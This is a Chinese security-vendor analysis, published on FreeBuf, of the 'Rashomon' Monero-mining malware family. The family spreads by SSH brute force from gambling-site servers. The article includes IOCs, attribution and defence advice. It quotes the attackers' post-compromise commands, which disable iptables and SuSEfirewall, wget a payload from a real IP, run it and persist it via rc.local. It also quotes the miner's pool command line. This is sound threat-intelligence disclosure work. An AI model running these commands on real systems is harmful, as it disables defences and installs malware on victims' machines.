@@ -1,0 +1,319 @@
+## 一、前言
+
+**腾讯安全云鼎实验室通过部署的威胁感知系统捕获了一批挖矿样本（具有同源性），是一批可挖取门罗币(xmr)的挖矿病毒。这批样本今年5月开始出现，目前各大杀软对此样本基本无法有效查杀，腾讯云云镜第一时间跟进查杀。根据进一步溯源的信息可以推测该挖矿团伙利用被入侵的博彩网站服务器进行病毒传播。**
+
+分析显示，此挖矿样本不具有传播性，总体结构式是 Loader + 挖矿子体，挖矿团伙通过控制的机器进行远程 SSH
+暴力破解并将病毒进行传播。由于目前能对付此病毒的杀软极少，且该病毒通过入侵的赌博网站服务器进行病毒传播、挖矿，让真相扑朔迷离，云鼎实验室威胁情报小组将本次门罗币挖矿新家族命名为「罗生门」。
+
+##  **二、入侵分析**
+
+挖矿样本通过母体释放挖矿子体，母体是 Loader ，释放挖矿子体，执行挖矿子体。母体本身不包含 SSH 爆破等蠕虫动作，子体就是单纯的挖矿代码（加壳变形
+UPX）。通过观测发现，进行 SSH 爆破的主机 IP
+较少且固定，可以认定为固定机器，使用工具进行扫描、爆破。通过这种广撒网的方式，犯罪团伙能收获不少门罗币。
+
+###  **攻击流程图：**
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539073913_5bbc6779e3945.png!small)
+
+###  **攻击过程示意：**
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539073961_5bbc67a9e0ef4.png!small)
+
+攻击日志来源：<http://bikewiki.jp:5000/app/2018/07/27/073148-4879.log>
+
+###  **母体 Loader 详细分析：**
+
+母体 Loader 的行为包含自启动和释放运行文件两个部分。
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074064_5bbc6810c821c.png!small)
+
+###  **自启动代码：**  
+
+在函数 main_Boot 中通过 sed 编辑 rc.local 和 boot.local 来进行自启动。  
+
+**释放文件：**
+
+**![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074231_5bbc68b726e41.png!small)**
+
+ **执行文件：**
+
+**![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074245_5bbc68c59b016.png!small)**
+
+##  **三、病毒子体分析**
+
+通过对挖矿样本进行分析发现，子体是一个加壳后的标准矿机程序， **子体加壳** 也是导致杀软无法查杀的一个方式。子体加壳为 UPX
+变形壳，可以抵抗通用脱壳机的脱壳。手动脱壳后发现为标准挖矿程序（开源矿机程序）。
+
+相关开源项目连接为：<https://github.com/sumoprojects/cryptonote-sumokoin-pool>
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074348_5bbc692c722bc.png!small)
+
+##  **四、矿池分析与统计**
+
+据观测今年5月至9月初，蜜罐捕获的「罗生门」挖矿病毒累计挖出约12.16个门罗币，价值约1w人民币（2018年10月8日，门罗币价格为114.2USD，合计1388.67美金），算力为8557H/S,大约是皮皮虾矿池的百分之一算力。从算力上看，这种广撒网式的传播，也能有一定的规模。  
+
+**挖矿样本执行挖矿的命令如下：**
+
+    
+    
+     -B -ostratum+tcp://mine.ppxxmr.com:7777-u 41tPS2hg6nc6DWNXDiWG7ngGSnLAaw4zmBeM478r1tkZDGH1y8aFPDiDqAFN8LouyAXTxtrLVigmRgLXytezCM'Qf1FwzqEi-px -k --max-cpu-usage=75
+
+从挖矿命令中可知，挖矿样本对 CPU 利用率有一定的限制，最大 CPU 使用量为75%。
+
+挖矿样本针对的矿池地址和门罗币(xmr)产量如下：
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074469_5bbc69a534638.jpg!small)
+
+ **对应的钱包地址为：**
+
+> **钱包地址：**
+>
+>
+> 45KGejq1HDHXB618E3aeWHFyoLh1kM5syRG8FHDiQ4pZXZF1pieqW7DM5HHe3Y2oc1YwoEc7ofjgtbeEqV3UrkS9SVygJPT  
+>
+>
+>
+> 45KGejq1HDHXB618E3aeWHFyoLh1kM5syRG8FHDiQ4pZXZF1pieqW7DM5HHe3Y2oc1YwoEc7ofjgtbeEqV3UrkS9SVygJPT
+>
+>
+> 45vKgdPY4M3Lp4RXWccWCBFP7HCtcp718GyGaNVmi58j9rdDX716yz5MKXT2EDjFixgPW8mjnaXvz2cBUpEqVCLKFH1z9Tx
+>
+>
+> 45vKgdPY4M3Lp4RXWccWCBFP7HCtcp718GyGaNVmi58j9rdDX716yz5MKXT2EDjFixgPW8mjnaXvz2cBUpEqVCLKFH1z9Tx
+>
+>
+> 41tPS2hg6nc6DWNXDiWG7ngGSnLAaw4zmBeM478r1tkZDGH1y8aFPDiDqAFN8LouyAXTxtrLVigmRgLXytezCMQf1FwzqEi
+>
+>
+> 45KGejq1HDHXB618E3aeWHFyoLh1kM5syRG8FHDiQ4pZXZF1pieqW7DM5HHe3Y2oc1YwoEc7ofjgtbeEqV3UrkS9SVygJPT
+>
+>
+> 45KGejq1HDHXB618E3aeWHFyoLh1kM5syRG8FHDiQ4pZXZF1pieqW7DM5HHe3Y2oc1YwoEc7ofjgtbeEqV3UrkS9SVygJPT
+>
+>
+> 47xB4pdBngkhgTD1MdF9sidCa6QRXb4gv6qcGkV1TT4XD6LfZPo12CxeX8LCrqpVZm2eN3uAZ1zMQCcPnhWbLoPgNbK8y3Z
+>
+>
+> 41tPS2hg6nc6DWNXDiWG7ngGSnLAaw4zmBeM478r1tkZDGH1y8aFPDiDqAFN8LouyAXTxtrLVigmRgLXytezCMQf1FwzqEi
+
+##  **五、免杀分析**
+
+###  **1** **、检测效果：**
+
+将挖矿样本在 VirusTotal 中检测发现，除了 Drweb
+可以检出此样本，其余杀软均无法有效检测此样本。挖矿病毒5月出现，流行3月有余，VirusTotal 上依然只有1款杀软可以查杀。
+
+下图是挖矿样本在 VirusTotal 中的检测结果：
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074676_5bbc6a74cfe0f.png!small)
+
+###  **2** **、免杀流程：**
+
+基本所有杀软都无法查杀此病毒，此病毒通过 Go 语言 Loader 和子体加变形 UPX 壳进行免杀，对于 Linux 查杀较为薄弱的杀软，很容易漏报。
+
+ **免杀示意图：**
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074709_5bbc6a95b3829.png!small)
+
+Loader 使用 Go 语言编写，大量的 Go 语言的库代码掩盖了真正的病毒代码部分，所以免杀效果较好。2155个 Go
+语言库函数，真正的病毒代码包含在4个函数中。
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539074738_5bbc6ab2db908.png!small)
+
+##  **六、溯源分析**
+
+对这批挖矿样本进行溯源分析发现，从今年5月开始，发起攻击的 IP一共有两个：160.124.67.66、123.249.34.103
+
+另外，样本下载地址：181.215.242.240、123.249.9.141、
+123.249.34.103、58.221.72.157、160.124.48.150
+
+SSH 暴力破解成功后执行的命令有（suSEfirewall的关闭、iptables 的关闭、样本的下载）：
+
+> /etc/init.d/iptables stop;  
+>
+>
+> service iptables stop;  
+>
+>
+> SuSEfirewall2 stop;  
+>
+>
+> reSuSEfirewall2 stop;cd/tmp;
+>
+> wget -c<http://181.215.242.240/armtyu>;
+>
+> chmod 777 armtyu;./armtyu;
+>
+> echo "cd/tmp/">>/etc/rc.local;
+>
+> echo"./armtyu&">>/etc/rc.local;echo "/etc/init.d/iptablesstop
+
+**IP** **地址** |  **服务器地址** |  **对外开放服务** |  **其他描述**  
+---|---|---|---  
+181.215.242.240 |  美国 |  netbios |  ftp、垃圾邮件、僵尸网络  
+160.124.67.66 |  中国 香港 |  netbios |
+mmhongcan168.com、28zuche.com、014o.com、ip28.net、扫描  
+160.124.48.150 |  中国 香港 |  netbios |  ip28.net、扫描  
+123.249.9.141 |  中国 贵州 |  |  僵尸网络  
+  
+（扫描 IP 和下载 IP  信息表）  
+
+表格中 160.124.67.66 是扫描 IP，通过对 IP 信息的图谱聚类，发现香港的两台主机均为一个团伙控制的机器。美国和贵州的机器是入侵得到的机器。
+
+![12.png](https://image.3001.net/images/20181009/1539074972_5bbc6b9c328f1.png!small)
+
+（团伙图聚类）
+
+上面提到的扫描机器均为赌博网站的机器，曾经的域名mmhongcan168、28zuche 等都是赌博网站。
+
+ **28zuche** **：**
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539075319_5bbc6cf7a6a07.png!small)![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539075341_5bbc6d0d4d7b6.png!small)
+
+另一台香港机器的域名为 himitate.com，也是赌博网站。  
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539075359_5bbc6d1fd261c.png!small)
+
+两台香港主机均为 ip28.net，都可以作为门罗币(xmr)的挖矿代理主机。  
+
+**黑产江湖之黑吃黑：**
+
+有人的地方就有江湖，黑产作为互联网中的法外之地，弱肉强食也是这个不法之地的规则。有做大产业的黑产大佬，也有干一票就走的小团伙，黑吃黑几乎天天都在上演。
+
+赌博网站和色情网站是黑吃黑中常常被吃的对象，经研究分析可知，众多赌博网站所在的服务器竟被用来做扫描，各赌博网站之间并没发现强关联性，做赌博的团伙同时做挖矿的跨界运营也不是很多，而且整个挖矿金额不高。挖矿团伙若是入侵了赌博网站，利用其作为病毒服务器传播挖矿病毒，这也不是不可能。
+
+对于美国和贵州的两台下载机，根据 threatbook 的情报，这两台主机应该是肉鸡，如下图：
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539075395_5bbc6d4374a91.png!small)
+
+第二个扫描地址为： **123.249.34.103**
+
+58.221.72.157 |  江苏 |  rat  
+---|---|---  
+123.249.34.103 |  贵州 |  scan  
+mdb7.cn |  美国 |  bot  
+  
+**地理位置：**
+
+扫描地址 123.249.34.103的实际地址为中国贵州黔西南布依族苗族自治州，相关的情报如下：
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539075412_5bbc6d54a5271.png!small)
+
+ **相关网站解析过的地址为：**
+
+> f6ae.com
+>
+> [www.f6ae.com](http://www.f6ae.com)
+>
+> [www.h88049.com](http://www.h88049.com)
+>
+> [www.h88034.com](http://www.h88034.com)
+>
+> h88032.com
+>
+> [www.h88032.com](http://www.h88032.com)
+>
+> h88034.com
+>
+> h88049.com
+>
+> h5770.com
+>
+> h88051.com
+
+ **以上 URL 地址均为赌博网站：**
+
+![门罗币挖矿新家族「罗生门」](https://image.3001.net/images/20181009/1539075444_5bbc6d745c90a.png!small)
+
+ **其他的一些情报** ：
+
+云鼎实验室威胁情报团队在网络上也观测到这些 IP 的扫描行为，很多日志都有记录。可以发现这个挖矿样本的扫描传播是一种无针对的、广撒网式的暴力破解传播模式。
+
+ **日志地址1：**
+
+ftp://egkw.com/Program%20Files/Apache%20Software%20Foundation/Tomcat%207.0/logs/localhost_access_log.2018-04-28.txt
+
+![19.png](https://image.3001.net/images/20181009/1539075459_5bbc6d8364fba.png!small)
+
+ **日志地址2：**
+
+<http://217.31.192.50/data/proki2018-05-13.txt>
+
+![20.png](https://image.3001.net/images/20181009/1539075478_5bbc6d9653a9d.png!small)
+
+##  **七、总结**
+
+通过观测发现扫描主机均属于赌博网站，赌博等黑产现在开始向挖矿业务进军了吗？。
+
+###  **防御方法：**
+
+> （1）修改 SSH 口令，要定期更换 SSH 口令，并保证一定的复杂度。
+>
+> （2）安装腾讯云云镜，提前发现可疑木马及暴力破解行为。
+>
+> （3）对于外部SSH 连接的 IP 进行黑白名单限制。
+
+###  **相关样本 hash：**
+
+> 48f82a24cf1e99c65100c2761f65265c
+>
+> 723bd57431aa759d68cecb83fc8a7df8
+>
+> a357b1b00e62cab7dc8953522f956009
+>
+> 470e7cdac0360ac93250f70a892a8d03
+>
+> 788eaec718569c69b21ff3daef723a8f
+>
+> bf34509ae03b6f874f6f0bf332251470
+>
+> 580cb306c4e4b25723696cb0a3873db4
+>
+> 826f3e5ee3addfbf6feadfe5deadbe5e
+>
+> dd68a5a3bf9fbb099c9c29e73dbab782
+
+###  **相关中间文件 sha256：**
+
+> 8797e998c01d2d6bb119beb2bbae3c2f84b6ae70c55edd108ed0e340972cf642
+>
+> f8e1957e8bfd7f281a76d1e42694049c67f39dea90ac36e9d589c14cdf8924bc
+>
+> f54b1e99039037f424e7e2ada7ae0740b6d1da229688a81e95fd6159f16fbbc1
+>
+> ca60d04204aa3195e8cd72887c7deced1a7c664e538256f138b5698d381ceb00
+>
+> e8b70f11c412a75ccfb48771029679db72c27bd61c41c72e65be5464415df95f
+>
+> 08fd38e2891942dadd936d71b7e98055ba48c58bc986d5c58f961055bcc378fc
+>
+> 08a31726ae65f630ce83b9a0a44108ff591809b14db5b7c0d0be2d0829211af5
+>
+> 1ac7ba4ba4b4a8c57b16cf4fac6ea29e41c0361c3260bf527278525b4bec5601
+>
+> 396a2174d2f09e8571e0f513a8082ccdd824e988b83393217274e64fe0dafd69
+>
+> b238c09c3fdbda62df39039ed49d60d42d32312eedadfc2c6ced4d65d27b1ddb
+>
+> 99802523c466ea9273de893be5c12c7c654dfd4deb5a896b55718e69b721e548
+>
+> 786f4d124ef75e9f45d650fbd859d591a03ca71e2625f50d3078503f76edfd34
+>
+> 1dfb2cd3c94c624691534446ece255c49ed3ba02f45128c19e5a853dcf6f6ab8
+>
+> 472ba9ddbef409975284e4428071d5b8eb576f2b27ad19ca2fad7094aeebd281
+>
+> 1fa25061004ea01311b2d27feda124b4262b5611f91882c2d9895f0a53016051
+>
+> 58ad0006fe9fd093c7af6f0065a93209f21074d6694f0351f25ece1b78b7a978
+>
+> fbb1396e37adcab88a0e21f9e0366c8da9a199652906fa194caccef8f70844c3
+>
+> f8ccdcc45c6cbd4cc1c8f56a320106cfc9c42ad94b499d5ca6ec280b1077bf41
+>
+> ffb9568a7b5da78389d20daba65e2e693e8c9828c874ad8771dcd5bb5c8a1e57
+>
+> f5aed11216ee356a4896ad22f375e2b62b7ca22e83737f24ec0e5cdaa400b051
+
+ ***本文作者 murphyzhang（腾讯安全云鼎实验室），转载请注明来自 FreeBuf.COM。**
+
